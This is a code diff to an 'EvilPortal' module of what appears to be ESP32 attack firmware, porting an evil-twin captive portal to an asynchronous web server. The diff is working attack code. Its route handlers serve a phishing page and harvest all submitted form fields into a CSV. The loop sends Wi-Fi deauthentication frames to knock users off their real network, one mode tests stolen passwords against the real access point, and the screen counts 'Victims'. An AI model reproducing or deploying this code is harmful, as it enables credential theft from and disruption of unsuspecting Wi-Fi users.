@@ -3,6 +3,7 @@
 #include "core/sd_functions.h"
 #include "core/mykeyboard.h"
 #include "core/wifi_common.h"
+#include "core/utils.h"
 #include "wifi_atks.h"
 #include "esp_wifi.h"
 
@@ -13,22 +14,37 @@ EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth, bool verifyPw
     loop();
 };
 
-
 EvilPortal::~EvilPortal() {
-    webServer.close();
+    webServer.end();
     dnsServer.stop();
 
     delay(100);
     wifiDisconnect();
 };
 
-
+void EvilPortal::CaptiveRequestHandler:: handleRequest(AsyncWebServerRequest *request) {
+    AsyncResponseStream *response = request->beginResponseStream("text/html");
+    String url = request->url();
+    if(url == "/")              _portal->portalController(request);
+    else if(url == "/post")     _portal->credsController(request);
+    else if(url == "/creds")    request->send(200, "text/html", _portal->creds_GET());
+    else if(url == "/ssid")     request->send(200, "text/html", _portal->ssid_GET());
+    else if(url == "/postssid") {
+        if (request->hasArg("ssid")) _portal->apName = request->arg("ssid").c_str();
+        request->send(200, "text/html", _portal->ssid_POST());
+        _portal->restartWiFi();
+    }
+    else {
+        if (request->args() > 0) _portal->credsController(request);
+        else _portal->portalController(request);
+    }
+  }
 bool EvilPortal::setup() {
     bool returnToMain = false;
     options = {
-        {"Custom Html", [=]() { loadCustomHtml(); }},
-        {"Main Menu",   [&]() { returnToMain = true; }}
+        {"Custom Html", [=]() { loadCustomHtml(); }}
     };
+    addOptionToMainMenu();
 
     if (!_verifyPwd) {
         // Insert Options
@@ -36,7 +52,7 @@ bool EvilPortal::setup() {
     } else {
         options.insert(options.begin(), {"Default", [=]() { loadDefaultHtml_one(); }});
     }
-        
+
     loopOptions(options);
 
     if (returnToMain) return false;
@@ -106,7 +122,7 @@ bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
         temp_stop = true;
     }
 
-    webServer.stop();
+    webServer.end();
     wifiDisconnect();
 
     // STA Mode temporary
@@ -131,49 +147,52 @@ bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
     if (WiFi.status() == WL_CONNECTED) {
         isConnected = true;
         delay(200);
-        
+
     }
     // re enable
     if (_deauth) {
         temp_stop = false;
     }
 
-    // revert to AP mode 
+    // revert to AP mode
     WiFi.mode(WIFI_MODE_AP);
     return isConnected;
 
 }
 
 void EvilPortal::setupRoutes() {
-    webServer.on("/", [this]() { portalController(); });
-    webServer.on("/post", [this]() {credsController();});
-    webServer.on("/creds", [this]() { webServer.send(200, "text/html", creds_GET()); });
-    webServer.on("/ssid", [this]() { webServer.send(200, "text/html", ssid_GET()); });
-    webServer.on("/postssid", [this]() {
-        if (webServer.hasArg("ssid")) apName = webServer.arg("ssid").c_str();
-        webServer.send(200, "text/html", ssid_POST());
+    // this must be done in the handleRequest() function too
+    webServer.on("/", [this](AsyncWebServerRequest * request) { portalController(request); });
+    webServer.on("/post", [this](AsyncWebServerRequest * request) {credsController(request);});
+    webServer.on("/creds", [this](AsyncWebServerRequest * request) { request->send(200, "text/html", creds_GET()); });
+    webServer.on("/ssid", [this](AsyncWebServerRequest * request) { request->send(200, "text/html", ssid_GET()); });
+    webServer.on("/postssid", [this](AsyncWebServerRequest * request) {
+        if (request->hasArg("ssid")) apName = request->arg("ssid").c_str();
+        request->send(200, "text/html", ssid_POST());
         restartWiFi();
     });
 
-    webServer.onNotFound([this]() {
-        if (webServer.args() > 0) credsController();
-        else portalController();
+    webServer.onNotFound([this](AsyncWebServerRequest * request) {
+        if (request->args() > 0) credsController(request);
+        else portalController(request);
     });
+
+    webServer.addHandler(new CaptiveRequestHandler(this)).setFilter(ON_AP_FILTER); //only when requested from AP
 }
 
 
 void EvilPortal::restartWiFi(bool reset) {
-    webServer.stop();
+    webServer.end();
     wifiDisconnect();
     WiFi.softAP(apName);
-    webServer.begin();  
+    webServer.begin();
 
     // code to handle whether to reset the counter..
 
     if (reset) {
         resetCapturedCredentials();
 
-    } 
+    }
 }
 
 void EvilPortal::resetCapturedCredentials(void) {
@@ -192,7 +211,6 @@ void EvilPortal::resetCapturedCredentials(void) {
         }
 
         dnsServer.processNextRequest();
-        webServer.handleClient();
 
         if ((!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) || (!temp_stop)) {
             send_raw_frame(deauth_frame, 26);  // Sends deauth frames if needed
@@ -235,14 +253,10 @@ void EvilPortal::drawScreen(bool holdDeauth) {
     padprintln("");
 
     if (!_verifyPwd) {
-        padprint("Victims: ");
+        padprint("Victims: " + String(totalCapturedCredentials));
     } else {
-        padprint("Attempt: ");
+        padprint("Attempt: " + String(totalCapturedCredentials));
     }
-    
-    tft.setTextColor(TFT_RED);
-    tft.println(String(totalCapturedCredentials));
-    tft.setTextColor(bruceConfig.priColor);
 
     padprintln("");
     printLastCapturedCredential();
@@ -317,49 +331,47 @@ void EvilPortal::loadDefaultHtml() {
 }
 
 
-void EvilPortal::portalController() {
-    if (isDefaultHtml) webServer.send(200, "text/html", htmlPage);
+void EvilPortal::portalController(AsyncWebServerRequest * request) {
+    if (isDefaultHtml) request->send(200, "text/html", htmlPage);
     else {
-        File html = fsHtmlFile->open(htmlFileName);
-        webServer.streamFile(html, "text/html");
-        html.close();
+        request->send(*fsHtmlFile, htmlFileName, "text/html");
     }
 }
 
 
 
 
-void EvilPortal::credsController() {
+void EvilPortal::credsController(AsyncWebServerRequest * request) {
     String htmlResponse = "<li>";
     String passwordValue = "";
     String csvLine = "";
     String key;
     lastCred = "";
 
-    for (int i = 0; i < webServer.args(); i++) {
-        key = webServer.argName(i);
-        
+    for (int i = 0; i < request->args(); i++) {
+        key = request->argName(i);
+
         if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") || key == "P1" || key == "P2" || key == "P3" || key == "P4") {
             continue;
         }
 
         // get key if verify
         if (key == "password" && _verifyPwd) {
-            passwordValue = webServer.arg(i);
+            passwordValue = request->arg(i);
         }
 
 
         // Build HTML and CSV line
-        htmlResponse += key + ": " + webServer.arg(i) + "<br>\n";
+        htmlResponse += key + ": " + request->arg(i) + "<br>\n";
         if (i > 0) {
             csvLine += ",";
         }
- 
+
         // Skip irrelevant parameters
 
-        csvLine += key + ": " + webServer.arg(i);
-        lastCred += key.substring(0, 3) + ": " + webServer.arg(i) + "\n";
-        
+        csvLine += key + ": " + request->arg(i);
+        lastCred += key.substring(0, 3) + ": " + request->arg(i) + "\n";
+
     }
 
 
@@ -394,8 +406,8 @@ void EvilPortal::credsController() {
 
     } else {
         saveToCSV(csvLine);
-        webServer.send(200, "text/html", wifiLoadPage());    
-        
+        request->send(200, "text/html", wifiLoadPage());
+
     }
 
 
